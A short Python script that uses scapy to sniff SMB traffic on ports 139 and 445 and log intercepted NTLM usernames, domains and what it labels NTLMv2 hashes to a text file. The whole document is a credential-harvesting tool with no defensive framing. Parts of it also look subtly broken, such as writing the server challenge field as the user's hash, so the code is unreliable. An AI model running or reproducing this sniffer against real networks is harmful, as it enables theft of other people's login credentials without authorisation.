import sys
import netifaces
from scapy.all import *
from scapy.layers.ntlm import NTLMSSP

def get_local_ip():
    iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    return netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']

def packet_listener(pkt):
    if pkt.haslayer(NTLMSSP):
        with open("intercepted_credentials.txt", "a") as f:
            f.write(f"Username: {pkt[NTLMSSP].Username.decode()}\n")
            f.write(f"Domain: {pkt[NTLMSSP].Domain.decode()}\n")
            f.write(f"NTLMv2 Hash: {pkt[NTLMSSP].NtServerChallenge.decode()}\n")
            f.write("=============================================\n")

def main():
    local_ip = get_local_ip()
    print("[+] Listening for network credentials on:", local_ip)
    sniff(filter="tcp and (port 139 or port 445)", prn=packet_listener, store=0)

if __name__ == "__main__":
    main()
